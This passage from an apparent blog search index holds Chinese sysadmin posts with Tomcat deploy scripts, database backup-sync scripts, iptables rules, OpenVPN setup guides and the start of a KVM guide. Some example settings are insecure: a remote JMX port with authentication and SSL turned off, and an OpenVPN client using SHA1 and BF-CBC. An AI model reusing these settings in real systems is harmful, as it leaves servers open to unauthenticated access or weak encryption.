\n```sh\n    export JAVA_HOME=/gotwo_data/Application/jdk1.7.0_79\n    export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar\n    export TOMCAT_HOME=/gotwo_data/Application/tomcat18080\n    export CATALINA_HOME=/gotwo_data/Application/tomcat18080\n    export PATH=$PATH:$JAVA_HOME/bin\n\n    JAVA_OPTS=\" -server -Xms2048M -Xmx2048M -XX:PermSize=256M -XX:MaxPermSize=256M -Xss256k -XX:+PrintGCDetails -Xloggc:/gotwo_data/Application/tomcat18080/logs/gc18080.log\"\n\n    CATALINA_OPTS=\"-Djava.rmi.server.hostname=192.168.2.64 -Dcom.sun.management.jmxremote.port=18088 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false\"\n```\n\n# 配置server.xml\n```sh\n    <Server port=\"18085\" shutdown=\"SHUTDOWN\"> 此端口为关闭本tomcat实例的端口, 必须设置, 且各个tomcat实例之间不能重复.\n\n    <Connector URIEncoding=\"UTF-8\" connectionTimeout=\"20000\" port=\"18080\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\" redirectPort=\"18083\"/>\n\n    <Connector port=\"18089\" protocol=\"AJP/1.3\" redirectPort=\"18083\" />\n```\n\n# tomcat软件部署脚本\ndeploy_tomcat.sh， 使用该脚本部署新tomcat的命令如下：\n```sh\nsudo sh deploy_tomcat.sh  180 1 /gotwo_data/deploy/photography-2.0.war \n```\n\n180：表示该tomcat实例的前3位端口号\n\n1: 表示该tomcat实例的第4位端口号\n\n/gotwo_data/deploy/photography-2.0.war  ： 表示要部署的war包\n\n\n```sh\n#!/bin/bash\n\nPROJ_CODE=$1\nTOMCAT_SEQ=$2\nPROJ_PKG=$3\n\nWEB_PORT=\"${PROJ_CODE}${TOMCAT_SEQ}0\"\nSSL_PORT=\"${PROJ_CODE}${TOMCAT_SEQ}3\"\nSHUTDOWN_PORT=\"${PROJ_CODE}${TOMCAT_SEQ}5\"\nJMX_PORT=\"${PROJ_CODE}${TOMCAT_SEQ}8\"\nAPACHE_PORT=\"${PROJ_CODE}${TOMCAT_SEQ}9\"\n\nTOMCAT_PKG=\"/gotwo_data/scripts/template/tomcat\"\nDEST_TOMCAT_DIR=\"/gotwo_data/Application/tomcat${WEB_PORT}\"\nCATA_TEMPLATE=\"${DEST_TOMCAT_DIR}/bin/catalina.sh\"\nXML_TEMPLATE=\"${DEST_TOMCAT_DIR}/conf/server.xml\"\n\n#echo $DEST_TOMCAT_DIR\n#echo $CATA_TEMPLATE\n#echo $XML_TEMPLATE\n\ncp -r $TOMCAT_PKG $DEST_TOMCAT_DIR\n\nsed -i \"s/##WEB_PORT##/${WEB_PORT}/g\" $XML_TEMPLATE\nsed -i \"s/##SSL_PORT##/${SSL_PORT}/g\" $XML_TEMPLATE\nsed -i \"s/##SHUTDOWN_PORT##/${SHUTDOWN_PORT}/g\" $XML_TEMPLATE\n\nsed -i \"s/##WEB_PORT##/${WEB_PORT}/g\" $CATA_TEMPLATE\nsed -i \"s/##JMX_PORT##/${JMX_PORT}/g\" $CATA_TEMPLATE\n\nrm -rf ${DEST_TOMCAT_DIR}/webapps/*\ncp $PROJ_PKG ${DEST_TOMCAT_DIR}/webapps/ROOT.war\n\nchown -R tomcat.tomcat $DEST_TOMCAT_DIR\n```\n\n# tomcat项目部署脚本\n\ndeploy_proj.sh， 使用该脚本部署新tomcat的命令如下：\n```sh\nsudo sh deploy_proj.sh  18010 /gotwo_data/deploy/photography-2.0.war \n```\n\n18010：表示该tomcat实例的端口号\n\n/gotwo_data/deploy/photography-2.0.war  ： 表示要部署的war包\n\n\n```sh\n#!/bin/bash\n\nTOMCAT_PORT=$1\nPROJ_FILE=$2\n\nBASE_DIR=\"/gotwo_data/Application/tomcat\"\nTOMCAT_DIR=\"${BASE_DIR}${TOMCAT_PORT}\"\nWORK_DIR=\"${TOMCAT_DIR}/work\"\nWEBAPPS_DIR=\"${TOMCAT_DIR}/webapps\"\nUPLOAD_BAK_DIR=\"$WEBAPPS_DIR/upload_`date +%F`\"\nBIN_DIR=\"${TOMCAT_DIR}/bin\"\n\nUNZIP=`which unzip`\n\n#Stop tomcat instance\necho \"Shutdown Tomcat $TOMCAT_PORT instance ...\"\nsudo -u tomcat sh ${BIN_DIR}/catalina.sh stop\nsleep 10\n\n#ps -ef|grep \"tomcat${TOMCAT_PORT}\"\nps -ef|grep \"tomcat${TOMCAT_PORT}\"|grep -v \"grep\" > /dev/null\n\nwhile [ \"$?\" == \"0\" ]\ndo\n   sleep 5\ndone\n\necho \"Shutdown completed !\"\n\nif [ \"$TOMCAT_PORT\" == \"18000\" ]\nthen\n   echo \"purge web cache ...\"\n   rm -rf /gotwo_data/sites/proxycache/*\n   mv $WEBAPPS_DIR/ROOT/ueditor/jsp/upload $UPLOAD_BAK_DIR\nfi\n\necho \"Remove war package with last version ......\"\nrm -rf ${WORK_DIR}/*\nrm -rf ${WEBAPPS_DIR}/ROOT/\nmv ${WEBAPPS_DIR}/ROOT.war ${WEBAPPS_DIR}/ROOT.war`date +%F`\nmv $PROJ_FILE ${WEBAPPS_DIR}/ROOT.war\n\n#chown tomcat.tomcat ${WEBAPPS_DIR}/ROOT.war\nsudo -u tomcat $UNZIP ${WEBAPPS_DIR}/ROOT.war -d ${WEBAPPS_DIR}/ROOT\ncp -f ${WEBAPPS_DIR}/x.properties  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/x.properties\ncp -f ${WEBAPPS_DIR}/logback.xml  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/logback.xml\ncp -f ${WEBAPPS_DIR}/IOC.xml  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/IOC.xml\ncp -f ${WEBAPPS_DIR}/task.xml  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/task.xml\ncp -f ${WEBAPPS_DIR}/sms.properties  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/sms.properties\ncp -f ${WEBAPPS_DIR}/consumer.properties  ${WEBAPPS_DIR}/ROOT/WEB-INF/classes/consumer.properties\n\nif [ \"$TOMCAT_PORT\" == \"18000\" ]\nthen\n   rm -rf $WEBAPPS_DIR/ROOT/ueditor/jsp/upload/* \n   mkdir -p $WEBAPPS_DIR/ROOT/ueditor/jsp/upload\n   cp -rf $UPLOAD_BAK_DIR/*  $WEBAPPS_DIR/ROOT/ueditor/jsp/upload/\nfi\n\nchown -R tomcat.tomcat $WEBAPPS_DIR\n\necho \"Startup Tomcat $TOMCAT_PORT instance ...\"\nsudo -u tomcat sh ${BIN_DIR}/catalina.sh start\n\necho \"Startup completed !\"\n\nps -ef|grep \"tomcat${TOMCAT_PORT}\"\n```","tags":["tomcat"],"categories":["service"]},{"title":"mongodb线上线下同步备份脚步","url":"/2017/06/08/database/mongodb线上线下同步备份脚步/","content":"\n同步线上线下mongodb。\n\n<!-- more -->\n\n```sh\n#bin/bash\n\nrestore(){\n\tFILE=`/usr/bin/rsync --port 40004 --list-only --password-file=/etc/rsyncd.secrets backup@$1::mongodb_backup/ | \t  /usr/bin/tail -1 | /bin/awk '{print $5}'`\n\tPATH=/gotwo_data/backup/mongodb\n\tDATE=`/bin/date +%F`\n\t/bin/rm -rf ${PATH}/$2/*\n\t/usr/bin/rsync -avz --port 40004 --password-file=/etc/rsyncd.secrets backup@$1::mongodb_backup/${FILE} ${PATH}/$2/\n\n\t/usr/bin/mongorestore -d $2 --drop --gzip  ${PATH}/$2/${DATE}/$2/\n}\n\nrestore 114.114.114.114  db_name\n```","tags":["mongodb"],"categories":["database"]},{"title":"mysql线上线下同步备份脚步","url":"/2017/06/08/database/mysql线上线下同步备份脚步/","content":"\n将线上多个数据库同步并导入到线下一个数据库中。\n\n<!-- more -->\n\n```sh\n#!/bin/bash\n\n# 本地mysql数据库登录账号\nuser='xxx'\n# 本地mysql数据库登录密码\npass='xxx'\n\n# db_test1库\ndb1='db_test1'\n\n# db_test2库\ndb2='db_test2'\n\n# db_test3库\ndb3='db_test3'\n\n\n# 数据库在线上的备份服务器IP \nserver1='1.1.1.1'\nserver2='2.2.2.2'\n\n# 删除老数据库备份，下载最新数据库备份\nfunction rsync_db() {\n  showMsg \"开始同步数据库$2...\"\n  file=`rsync --port 30004 --list-only --password-file=/etc/rsync.passwd backup@$1::mysql_backup/$2/ | tail -1 | awk '{print $5}'`\n  path=\"/gotwo_data/backup/mysql/$2/\"\n\n  if [ ! -f ${path}${file} ]\n  then\n    showMsg \"删除老数据库备份...\"\n    rm ${path}*.* 2>/dev/null\n    showMsg \"下载最新的数据库备份...\"\n    rsync -av --port 30004 --password-file=/etc/rsync.passwd backup@$1::mysql_backup/$2/${file} ${path}\n\n  else\n    showMsg ${path}${file}\"文件已存在！\"\n  fi\n}\n\n\n#导入数据库\nfunction restore_db() {\n    showMsg \"开始同步数据库$1...\"\n    file=`ls /gotwo_data/backup/mysql/$1`\n    path=\"/gotwo_data/backup/mysql/$1/\"\n\n    showMsg \"将最新的${1}数据库备份导入测试数据库...\"\n    gzip -d < ${path}${file} | mysql -u${user} -p${pass} --socket=/gotwo_data/mysql/my40003/socket/mysqld.sock $1 2>/dev/null\n}\n\n# 格式化输出日志\nfunction showMsg() {\n  echo \"`date +%Y-%m-%d\\ %H:%M:%S`    $1\"\n}\n\nshowMsg \"开始同步数据库！\"\n\n\n# db_test1同步\nrsync_db $server1 $db1\n\n# db_test2同步\nrsync_db $server1 $db2\n\n# db_test3同步\nrsync_db $server2 $db3\n\nshowMsg \"开始导入数据库！\"\n\n# db_test1导入\nrestore_db db_test1 &\n\n# db_test2 导入\nrestore_db db_test2 &\n\n# db_test3导入\nrestore_db db_test3 &\n\nshowMsg \"备份恢复脚本执行完成！\"\n```\n","tags":["mysql"],"categories":["database"]},{"title":"Linux服务器iptables配置","url":"/2017/06/07/service/Linux服务器iptables配置/","content":"\n一些工作中用到的防火墙规则样例。\n\n<!-- more -->\n\n# 防火墙规则示例脚本\n\n```sh\n#!/bin/bash\n\nIPTABLES=/sbin/iptables\nMODPROBE=/sbin/modprobe\n\n# IP4\necho \"[+] Flushing existing $IPTABLES rules...\"\n$IPTABLES -F\n$IPTABLES -F -t nat\n$IPTABLES -X\n$IPTABLES -t filter -P INPUT DROP\n$IPTABLES -t filter -P OUTPUT DROP\n$IPTABLES -t filter -P FORWARD DROP\n\n# load connection-tracking modules\necho \"[+] Modprode iptables modle...\"\n$MODPROBE ip_conntrack\n$MODPROBE iptable_nat\n$MODPROBE ip_conntrack_ftp\n$MODPROBE ip_nat_ftp\n\n# IP4\necho \"[+] Setting up OUTPUT chain...\"\n$IPTABLES -t filter -A INPUT -i lo -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -o lo -j ACCEPT\n\n# ping limit\n$IPTABLES -t filter -A INPUT -p icmp  -m state --state NEW,ESTABLISHED,RELATED  -m icmp --icmp-type echo-request    -m limit --limit 10/second  -j ACCEPT\n$IPTABLES -t filter -A INPUT -p icmp  -m state --state NEW,ESTABLISHED,RELATED  -m icmp --icmp-type echo-reply    -m limit --limit 10/second  -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p icmp -m state --state NEW,ESTABLISHED,RELATED    -j ACCEPT\n\n# SSH PORT\n$IPTABLES -t filter -A INPUT -p tcp  --dport 60021 -m state --state NEW,ESTABLISHED  -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p tcp  --sport 60021 -m state --state ESTABLISHED -j ACCEPT\n\n# QQ MAIL SMTP PORT\n$IPTABLES -t filter -A INPUT -p tcp  --dport 465 -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p tcp  --dport 465 -j ACCEPT\n$IPTABLES -t filter -A INPUT -p tcp  --sport 25  -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p tcp  --dport 25 -j ACCEPT\n\n# MYSQL\n$IPTABLES -t filter -A INPUT  -p tcp -m tcp -s 113.207.31.47 --dport 41003 -m state --state NEW,ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A OUTPUT  -p tcp -m tcp -d 113.207.31.47  --sport 41003 -m state --state NEW,ESTABLISHED -j ACCEPT\n\n# REDISS\n$IPTABLES -t filter -A INPUT  -p tcp -m tcp -s 12.4.25.22 --dport 6379 -m state --state NEW,ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A OUTPUT  -p tcp -m tcp -d 12.4.25.22 --sport 6379 -m state --state ESTABLISHED -j ACCEPT\n\n\n# TAOBAO api\n$IPTABLES -t filter -A INPUT  -p tcp -m tcp -s 122.199.160.211 -m state --state NEW,ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A OUTPUT  -p tcp -m tcp -d 122.199.160.211 -m state --state NEW,ESTABLISHED -j ACCEPT\n\n# zabbix\n$IPTABLES -t filter -A INPUT  -p tcp -m tcp -s 119.119.119.119 --dport 10050 -m state --state NEW,ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A OUTPUT  -p tcp -m tcp -d 119.119.119.119 --sport 10050 -m state --state ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A INPUT  -p tcp -m tcp -s 119.119.119.119 --sport 10051 -m state --state ESTABLISHED -j ACCEPT\n$IPTABLES -t filter -A OUTPUT  -p tcp -m tcp -d 119.119.119.119 --dport 10051 -m state --state NEW,ESTABLISHED -j ACCEPT\n\n# web port\n$IPTABLES -t filter -A INPUT -p tcp -m state --state NEW,ESTABLISHED -m multiport --destination-port  80,443 -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p tcp -m state --state ESTABLISHED -m multiport --source-port  80,443 -j ACCEPT\n\n\n$IPTABLES -t filter -A OUTPUT -p tcp -m state --state NEW,ESTABLISHED -m multiport --destination-port  80,443 -j ACCEPT\n$IPTABLES -t filter -A INPUT -p tcp -m state --state ESTABLISHED -m multiport --source-port  80,443 -j ACCEPT\n\n# DNS \n$IPTABLES -t filter -A INPUT -p udp -m state --state ESTABLISHED  --sport 53 -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT\n\n\n# NTP TIME SYNC\n$IPTABLES -t filter -A INPUT  -p udp -m state --state ESTABLISHED --sport 123  -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 123  -j ACCEPT\n\n#limit syn foold\n$IPTABLES -t filter  -A INPUT -p tcp --syn -m limit --limit 2048/s -j ACCEPT\n\n\n##############Iptables save and restart\necho \"Iptables save and restart ...\"\n/etc/init.d/iptables  save\n/etc/init.d/iptables restart\n\n```\n\n# 防火墙debug脚本\n\n```sh\nIPTABLES=/sbin/iptables\nMODPROBE=/sbin/modprobe\n\n####IP4\necho \"[+] Flushing existing $IPTABLES rules...\"\n$IPTABLES -F\n$IPTABLES -F -t nat\n$IPTABLES -X\n$IPTABLES -t filter -P INPUT ACCEPT\n$IPTABLES -t filter -P OUTPUT ACCEPT\n$IPTABLES -t filter -P FORWARD ACCEPT\n$IPTABLES -t filter -A INPUT -p udp -m state --state ESTABLISHED  --sport 53 -j ACCEPT\n$IPTABLES -t filter -A OUTPUT -p udp -m state --state NEW,ESTABLISHED --dport 53 -j ACCEPT\n\n##############Iptables save and restart\necho \"Iptables save and restart ...\"\n/etc/init.d/iptables   save\n/etc/init.d/iptables  restart\n```\n","tags":["iptables"],"categories":["service"]},{"title":"Ubuntu 15.04 上配置 OpenVPN 服务器和客户端","url":"/2017/06/06/service/在Ubuntu15.04上配置OpenVPN服务器和客户端/","content":"\n　　虚拟专用网（VPN）常指几种通过其它网络建立连接技术。它之所以被称为“虚拟”，是因为各个节点间的连接不是通过物理线路实现的，而“专用”是指如果没有网络所有者的正确授权是不能被公开访问到。\n\n<!-- more -->\n\n　　OpenVPN软件借助TUN/TAP驱动使用TCP和UDP协议来传输数据。UDP协议和TUN驱动允许NAT后的用户建立到OpenVPN服务器的连接。此外，OpenVPN允许指定自定义端口。它提供了更多的灵活配置，可以帮助你避免防火墙限制。\n\n　　OpenVPN中，由OpenSSL库和传输层安全协议（TLS）提供了安全和加密。TLS是SSL协议的一个改进版本。\n\n　　OpenSSL提供了两种加密方法：对称和非对称。下面，我们展示了如何配置OpenVPN的服务器端，以及如何配置使用带有公共密钥基础结构（PKI）的非对称加密和TLS协议。\n\n# 服务器端配置\n\n　　首先，我们必须安装OpenVPN软件。在Ubuntu 15.04和其它带有‘apt’包管理器的Unix系统中，可以通过如下命令安装：\n\n```sh\nsudo apt-get install openvpn\n```\n\n　　然后，我们必须配置一个密钥对，这可以通过默认的“openssl”工具完成。但是，这种方式十分难。这也是我们使用“easy-rsa”来实现此目的的原因。接下来的命令会将“easy-rsa”安装到系统中。\n\n```sh\nsudo apt-get install easy-rsa\n```\n\n　　**注意**： 所有接下来的命令要以超级用户权限执行，如在使用`sudo -i`命令后执行，或者你可以使用`sudo -E`作为接下来所有命令的前缀。\n\n　　开始之前，我们需要拷贝“easy-rsa”到openvpn文件夹。\n\n```sh\nmkdir /etc/openvpn/easy-rsa\ncp -r /usr/share/easy-rsa /etc/openvpn/easy-rsa\nmv /etc/openvpn/easy-rsa/easy-rsa /etc/openvpn/easy-rsa/2.0\n```\n\n　　然后进入到该目录\n  \n```sh\ncd /etc/openvpn/easy-rsa/2.0\n```\n\n　　这里，我们开始密钥生成进程。\n\n　　首先，我们编辑一个“vars”文件。为了简化生成过程，我们需要在里面指定数据。这里是“vars”文件的一个样例：\n\n```sh\nexport KEY_COUNTRY=\"CN\"\nexport KEY_PROVINCE=\"BJ\"\nexport KEY_CITY=\"Beijing\"\nexport KEY_ORG=\"Linux.CN\"\nexport KEY_EMAIL=\"open@vpn.linux.cn\"\nexport KEY_OU=server\n```\n\n　　希望这些字段名称对你而言已经很清楚，不需要进一步说明了。\n\n　　其次，我们需要拷贝openssl配置。另外一个版本已经有现成的配置文件，如果你没有特定要求，你可以使用它的上一个版本。这里是1.0.0版本。\n\n```sh\ncp openssl-1.0.0.cnf openssl.cnf\n```\n\n　　第三，我们需要加载环境变量，这些变量已经在前面一步中编辑好了。\n\n```sh\nsource ./vars\n```\n\n　　生成密钥的最后一步准备工作是清空旧的证书和密钥，以及生成新密钥的序列号和索引文件。可以通过以下命令完成。\n\n```sh\n./clean-all\n```\n\n　　现在，我们完成了准备工作，准备好启动生成进程了。让我们先来生成证书。\n\n```sh\n./build-ca\n```\n\n　　在对话中，我们可以看到默认的变量，这些变量是我们先前在“vars”中指定的。我们可以检查一下，如有必要进行编辑，然后按回车几次。对话如下\n\n```sh\nGenerating a 2048 bit RSA private key\n.............................................+++\n...................................................................................................+++\nwriting new private key to 'ca.key'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) [Beijing]:\nOrganization Name (eg, company) [Linux.CN]:\nOrganizational Unit Name (eg, section) [Tech]:\nCommon Name (eg, your name or your server's hostname) [Linux.CN CA]:\nName [EasyRSA]:\nEmail Address [open@vpn.linux.cn]:\n```\n\n　　接下来，我们需要生成一个服务器密钥\n\n```sh\n./build-key-server server\n```\n\n　　该命令的对话如下：\n\n```sh\nGenerating a 2048 bit RSA private key\n........................................................................+++\n............................+++\nwriting new private key to 'server.key'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [CN]:\nState or Province Name (full name) [BJ]:\nLocality Name (eg, city) [Beijing]:\nOrganization Name (eg, company) [Linux.CN]:\nOrganizational Unit Name (eg, section) [Tech]:\nCommon Name (eg, your name or your server's hostname) [Linux.CN server]:\nName [EasyRSA]:\nEmail Address [open@vpn.linux.cn]:\nPlease enter the following 'extra' attributes\nto be sent with your certificate request\nA challenge password []:\nAn optional company name []:\nUsing configuration from /etc/openvpn/easy-rsa/2.0/openssl-1.0.0.cnf\nCheck that the request matches the signature\nSignature ok\nThe Subject's Distinguished Name is as follows\ncountryName :PRINTABLE:'CN'\nstateOrProvinceName :PRINTABLE:'BJ'\nlocalityName :PRINTABLE:'Beijing'\norganizationName :PRINTABLE:'Linux.CN'\norganizationalUnitName:PRINTABLE:'Tech'\ncommonName :PRINTABLE:'Linux.CN server'\nname :PRINTABLE:'EasyRSA'\nemailAddress :IA5STRING:'open@vpn.linux.cn'\nCertificate is to be certified until May 22 19:00:25 2025 GMT (3650 days)\nSign the certificate? [y/n]:y\n1 out of 1 certificate requests certified, commit? [y/n]y\nWrite out database with 1 new entries\nData Base Updated\n```\n\n　　这里，最后两个关于“签署证书”和“提交”的问题，我们必须回答“yes”。\n\n　　现在，我们已经有了证书和服务器密钥。下一步，就是去省城Diffie-Hellman密钥。执行以下命令，耐心等待。在接下来的几分钟内，我们将看到许多点和加号。\n\n```sh\n./build-dh\n```\n\n　　该命令的输出样例如下\n\n```sh\nGenerating DH parameters, 2048 bit long safe prime, generator 2\nThis is going to take a long time\n................................+................<许多的点>\n```\n\n　　在漫长的等待之后，我们可以继续生成最后的密钥了，该密钥用于TLS验证。命令如下：\n\n```sh\nopenvpn --genkey --secret keys/ta.key\n```\n\n　　现在，生成完毕，我们可以移动所有生成的文件到最后的位置中。\n\n```sh\ncp -r /etc/openvpn/easy-rsa/2.0/keys/ /etc/openvpn/\n```\n\n　　最后，我们来创建OpenVPN配置文件。让我们从样例中拷贝过来吧：\n\n```sh\ncp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz /etc/openvpn/\ncd /etc/openvpn\ngunzip -d /etc/openvpn/server.conf.gz\n```\n\n　　然后编辑\n\n```sh\nvim /etc/openvpn/server.conf\n```\n\n　　我们需要指定密钥的自定义路径\n\n```sh\nca /etc/openvpn/keys/ca.crt\ncert /etc/openvpn/keys/server.crt\nkey /etc/openvpn/keys/server.key # This file should be kept secret\ndh /etc/openvpn/keys/dh2048.pem\n```\n\n　　一切就绪。在重启OpenVPN后，服务器端配置就完成了。\n\n```sh\nservice openvpn restart\n```\n\n# Unix的客户端配置\n\n　　假定我们有一台装有类Unix操作系统的设备，比如Ubuntu 15.04，并安装有OpenVPN。我们想要连接到前面建立的OpenVPN服务器。首先，我们需要为客户端生成密钥。为了生成该密钥，请转到服务器上的对应目录中：\n\n```sh\ncd /etc/openvpn/easy-rsa/2.0\n```\n\n　　加载环境变量\n\n```sh\nsource vars\n```\n\n　　然后创建客户端密钥\n\n```sh\n./build-key client\n```\n\n　　我们将看到一个与先前关于服务器密钥生成部分的章节描述一样的对话，填入客户端的实际信息。\n\n　　如果需要密码保护密钥，你需要运行另外一个命令，命令如下\n\n```sh\n./build-key-pass client\n```\n\n　　在此种情况下，在建立VPN连接时，会提示你输入密码。\n\n　　现在，我们需要将以下文件从服务器拷贝到客户端/etc/openvpn/keys/文件夹。\n\n　　服务器文件列表：\n\n- ca.crt,\n- dh2048.pem,\n- client.crt,\n- client.key,\n- ta.key.\n\n　　在此之后，我们转到客户端，准备配置文件。配置文件位于/etc/openvpn/client.conf，内容如下\n\n```sh\ndev tun\nproto udp\n\n# 远程 OpenVPN 服务器的 IP 和 端口号\nremote 111.222.333.444 1194\n\nresolv-retry infinite\n\nca /etc/openvpn/keys/ca.crt\ncert /etc/openvpn/keys/client.crt\nkey /etc/openvpn/keys/client.key\ntls-client\ntls-auth /etc/openvpn/keys/ta.key 1\nauth SHA1\ncipher BF-CBC\nremote-cert-tls server\ncomp-lzo\npersist-key\npersist-tun\n\nstatus openvpn-status.log\nlog /var/log/openvpn.log\nverb 3\nmute 20\n```\n\n　　在此之后，我们需要重启OpenVPN以接受新配置。\n\n```sh\nservice openvpn restart\n```\n\n　　好了，客户端配置完成。\n\n#安卓客户端配置\n\n　　安卓设备上的OpenVPN配置和Unix系统上的十分类似，我们需要一个含有配置文件、密钥和证书的包。文件列表如下：\n\n\n- 配置文件 (扩展名 .ovpn),\n- ca.crt,\n- dh2048.pem,\n- client.crt,\n- client.key.\n\n　　客户端密钥生成方式和先前章节所述的一样。\n\n　　配置文件内容如下\n\n```sh\nclient tls-client\ndev tun\nproto udp\n\n# 远程 OpenVPN 服务器的 IP 和 端口号\nremote 111.222.333.444 1194\n\nresolv-retry infinite\nnobind\nca ca.crt\ncert client.crt\nkey client.key\ndh dh2048.pem\npersist-tun\npersist-key\n\nverb 3\nmute 20\n```\n\n　　所有这些文件我们必须移动我们设备的SD卡上。\n\n　　然后，我们需要安装一个OpenVPN Connect 应用。\n\n　　接下来，配置过程很是简单：\n\n- 打开 OpenVPN 并选择“Import”选项\n- 选择“Import Profile from SD card”\n- 在打开的窗口中导航到我们放置好文件的目录，并选择那个 .ovpn 文件\n- 应用会要求我们创建一个新的配置文件\n- 点击“Connect”按钮并稍等一下\n\n　　搞定。现在，我们的安卓设备已经通过安全的VPN连接连接到我们的专用网。\n\n# 尾声\n\n　　虽然OpenVPN初始配置花费不少时间，但是简易的客户端配置为我们弥补了时间上的损失，也提供了从任何设备连接的能力。此外，OpenVPN提供了一个很高的安全等级，以及从不同地方连接的能力，包括位于NAT后面的客户端。因此，OpenVPN可以同时在家和企业中使用。\n","tags":["openvpn"],"categories":["service"]},{"title":"Ubuntu下OpenVPN客户端配置","url":"/2017/06/06/service/Ubuntu下OpenVPN客户端配置/","content":"\n# 安装OpenVPN\n\n　　首先需要安装OpenVPN客户端。一般来说直接使用apt-get即可。执行如下命令安装：\n\n```sh\n[root@www ~]# apt-get install openvpn\n```\n\n　　稍等片刻将自动安装好openvpn需要的软件包。安装完成后，应该出现 `/etc/openvpn/` 文件夹。 \n  \n<!-- more -->\n\n# 配置OpenVPN\n\n　　作为客户端，OpenVPN并没有特定的配置文件，而是由服务器提供方给出一个配置文件。对于认证，OpenVPN提供了两种认证方法：基于用户名/密码的认证与SSL证书认证。用户名/密码的认证方法无法（或较难）限制一个账号同时连接多个客户端，而采用证书，则可保证同一证书同一时间只能有一个 客户端连接。当然，这些都是由服务器端决定的，不需要客户端进行选择。\n\n　　首先将OpenVPN服务器提供商发给你的配置文件解压，并将所有文件都复制到 /etc/openvpn/中。\n\n这些文件中至少包含一个.ovpn文件，需要手动创建该文件，如：client.ovpn；如果服务器需要证书认证，则应该还存在另外三个证书文件。\n\n　　看懂OpenVPN配置格式。下面是一个.ovpn配置示例：\n\n```sh\nclient\ndev tap\nproto tcp-client\nremote 192.168.135.75 1194\nresolv-retry infinite\nnobind\nmute-replay-warnings\nredirect-gateway\nca /etc/openvpn/ca.crt\ncert /etc/openvpn/client.crt\nkey /etc/openvpn/client.key\ncomp-lzo\nverb 4\n```\n\n　　一般来说，ca.crt，client.crt，client.key可能需要你进行修改。将内容修改成这三个文件的实际位置。然后保存即可。 \n\n# 连接OpenVPN\n\n　　在配置好.ovpn文件后，执行\n\n```sh\nopenvpn /etc/openvpn/client.ovpn\n```\n　　即可连接服务器了（注意该目录下对应文件的权限）。注意，上面的参数应该换成你的配置文件实际位置。\n\n　　此时，终端会回显很多连接日志。如果连接不成功，则可以通过这些日志来确定出错位置。如果要断开，只需要通过Ctrl+C强制终止即可。\n\n　　上面的命令在实际中并不方便，因为它要占用一个独立的终端。在测试成功后，使用以下命令即可在后台连接OpenVPN：\n\n```sh\nopenvpn /etc/openvpn/client.ovpn > /dev/null &\n```\n\n　　值得称赞的是，openvpn非常智能，在连接异常中断、无法连接服务器、断网的情况下，它会自动重连。因此，如果希望开机即自动连接OpenVPN，或者是VPN常年在线，则可将上述命令行加入 `/etc/rc.local` 中。注意，命令末尾的&符号不能省略，否则将可能阻塞系统的正常启动。\n","tags":["openvpn"],"categories":["service"]},{"title":"kvm部署及虚拟机安装","url":"/2017/06/04/service/KVM部署及虚拟机安装/","content":"\n# 一. KVM安装\n\n## 1. 查看硬件是否支持虚拟化\n\n　　KVM需要CPU支持虚拟化，执行以下命令查看是否支持虚拟化：\n\n```sh\negrep '(vmx|svm)' --color=always /proc/cpuinfo\n```\n\n　　如果含有vmx或者svm字样，则表示支持CPU虚拟化，\n\n　　Intel是vmx，AMD是svm。\n\n<!-- more -->\n\n## 2. 安装KVM\n\n```sh\nyum install qemu-kvm qemu-img libvirt libvirt-python libguestfs-tools virt-install\n```\n\n　　**qemu-kvm** 是一个开源的虚拟机程序，为 KVM 虚拟机监视器提供硬件仿真，而 qemu-img 则提供了一个操纵磁盘镜像的命令行工具。\n\n　　**libvirt** 包含与操作系统的虚拟化功能交互的工具。\n\n　　**libvirt-python** 包含一个模块，它允许用 Python 写的应用来使用由 libvirt 提供的接口。\n\n　　**libguestfs-tools** 包含各式各样的针对虚拟机的系统管理员命令行工具。\n\n　　**virt-install** 包含针对虚拟机管理的其他命令行工具。\n\n\n### 2.1. 启动并开启了 libvirtd 服务\n\n```sh\n/etc/init.d/libvirtd start\n\nchkconfig libvirtd on\n```\n\n### 2.2. 配置转发\n\n　　文件/etc/sysctl.conf 中设置：\n\n```sh\nnet.ipv4.ip_forward = 1\n```\n\n### 2.3. 关闭网桥上的Netfilter(提高性能)\n\n```sh\nvim /etc/sysctl.conf:\n\n    net.bridge.bridge-nf-call-ip6tables = 0\n\n    net.bridge.bridge-nf-call-iptables = 0\n\n    net.bridge.bridge-nf-call-arptables = 0\n```\n\n### 2.4. 加载更改到当前的内核配置中：\n\n```sh\nsysctl -p\n```\n\n## 3. KVM网络配置\n\n### 3.1. 创建桥接器\n\n```sh\nvim /etc/sysconfig/network-scripts/ifcfg-br0\n\n    DEVICE=br0\n    